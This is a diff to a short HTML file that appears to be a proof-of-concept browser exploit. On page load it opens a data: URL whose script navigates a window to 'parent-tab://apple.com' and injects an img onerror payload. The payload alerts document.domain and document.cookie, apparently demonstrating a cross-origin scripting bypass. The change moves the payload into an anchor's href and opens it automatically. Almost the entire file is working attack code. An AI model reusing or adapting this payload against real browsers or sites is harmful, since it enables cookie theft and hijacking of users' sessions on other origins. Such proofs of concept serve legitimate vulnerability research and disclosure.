@@ -1,8 +1,12 @@
+<head>
 <script>
-function load() {
-  alert('calling load');
-  window.open("data:text/html,<script>function y(){x=open(&#x27;parent-tab://apple.com&#x27;,&#x27;_top&#x27;),x.document.body.innerHTML=&#x27;<img/src=""onerror=alert(document.domain);alert(document.cookie);>&#x27;};setTimeout(y,100)</script>", "_blank");
-}
+   function load() {
+     var url = document.getElementById('pew').href
+     alert(url);
+     window.open(url, '_blank');
+   }
 </script>
-<body onload='load()'>
+</head>
+<body onload="load()">
+<a id='pew' href='data:text/html,<script>function y(){x=open(&#x27;parent-tab://apple.com&#x27;,&#x27;_top&#x27;),x.document.body.innerHTML=&#x27;<img/src=""onerror=alert(document.domain);alert(document.cookie);>&#x27;};setTimeout(y,100)</script>'>hello</a>
 </body>
